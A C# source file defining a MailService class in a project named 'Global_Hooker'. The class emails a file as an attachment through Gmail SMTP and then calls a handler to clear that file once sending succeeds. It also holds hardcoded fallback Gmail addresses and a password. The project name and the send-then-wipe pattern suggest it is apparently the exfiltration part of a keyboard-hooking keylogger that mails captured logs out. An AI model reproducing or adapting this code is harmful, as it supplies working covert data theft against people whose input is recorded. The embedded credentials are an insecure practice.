using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Global_Hooker
{
    class MailService
    {
        public delegate void ClearFile(string path);

        private ClearFile _handler;
        private readonly SmtpClient _smtpClient;
        private readonly ConfigurationManager _configuration;

        private const string Host = "smtp.gmail.com";
        private const int Port = 587;

        public MailService(ClearFile handler)
        {
            _handler = handler;
            _configuration = ConfigurationManager.Instance;
            try
            {
                _smtpClient = new SmtpClient(Host, Port)
                {
                    Credentials = new System.Net.NetworkCredential(_configuration.EmailAddresser, _configuration.EmailPassword),
                    EnableSsl = true
                };
            }
            catch (Exception)
            {
                _smtpClient = new SmtpClient(Host, Port)
                {
                    Credentials = new System.Net.NetworkCredential("iipu.testing@gmail.com", "passwdpasswd"),
                    EnableSsl = true
                };
            }
        }

        public void SendMail(string filePath)
        {
            try
            {
                var mail = new MailMessage();
                try
                {
                    mail.From = new MailAddress(_configuration.EmailAddresser);
                    mail.To.Add(new MailAddress(_configuration.EmailAddressee));
                }
                catch (FormatException)
                {
                    mail.From = new MailAddress("iipu.addresser@gmail.com");
                    mail.To.Add(new MailAddress("iipu.testing@gmail.com"));
                }
                Attachment attachment = new Attachment(filePath);
                mail.Attachments.Add(attachment);
                _smtpClient.SendCompleted += (o, a) =>
                {
                    mail.Dispose();
                    attachment.Dispose();
                    SendCompleted(o,a);
                };
                _smtpClient.SendAsync(mail, filePath);
            }
            catch (SmtpException e)
            {
                Console.Write(e.ToString());
            }
        }

        private void SendCompleted(object sender, AsyncCompletedEventArgs args)
        {
            if (!args.Cancelled && args.Error == null)
            {
                _handler.Invoke(args.UserState.ToString());
                Console.WriteLine(args.ToString());
            }
        }
    }
}
